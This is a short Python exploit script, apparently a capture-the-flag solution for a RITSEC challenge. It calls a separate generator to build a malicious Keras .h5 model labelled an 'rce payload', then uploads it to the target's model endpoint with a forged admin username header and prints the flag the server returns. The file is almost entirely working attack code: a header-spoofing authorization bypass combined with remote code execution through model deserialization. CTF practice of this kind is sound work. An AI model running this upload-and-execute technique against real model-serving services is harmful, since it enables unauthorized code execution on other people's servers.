import requests
import subprocess

url = "https://regular-dude-19c554da-1bdf-4e1f-a97c-f3d59523be85.ctf.ritsec.club/"
s = requests.Session()

# generate keras rce payload
model_path = 'payload.h5'

subprocess.run(['py', '-3.10', 'payload.py'])

# upload
with open(model_path, 'rb') as f:
    res = s.post(f'{url}/model', headers={
        "Username": 'admin'
    }, files={
        'model': (model_path, f.read(), 'application/octet-stream')
    })

    print("Flag:", res.json()['predictions'])